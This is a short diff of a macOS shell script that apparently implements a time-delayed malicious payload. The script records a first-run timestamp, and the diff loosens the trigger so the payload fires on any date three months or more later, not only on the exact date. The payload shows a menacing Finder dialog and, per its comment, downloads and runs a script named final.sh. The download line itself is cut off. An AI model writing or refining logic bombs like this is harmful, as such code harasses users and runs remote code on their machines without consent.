@@ -82,13 +82,13 @@ if [ -f "$TIME_FILE" ]; then
   fi
 fi
 
- # === 3‑month payload: if exactly three months since initial run, trigger final.sh ===
+# === 3‑month payload: if more than three months since initial run, trigger final.sh ===
 if [ -f "$TIME_FILE" ]; then
   ORIG_TS_STR=$(cat "$TIME_FILE")
   # Compute the date exactly 3 months after original timestamp
   TARGET_DATE=$(date -j -f '%Y:%m:%d:%H:%M:%S' "$ORIG_TS_STR" -v+3m '+%Y%m%d')
   NOW_DATE=$(date '+%Y%m%d')
-  if [ "$NOW_DATE" = "$TARGET_DATE" ]; then
+  if [ "$NOW_DATE" -ge "$TARGET_DATE" ]; then
     # Notify user via Finder dialog
     osascript -e 'tell application "Finder" to display dialog "It'\''s the day, you were never forgiven." buttons {"OK"} default button 1'
     # Download and execute final.sh without curl
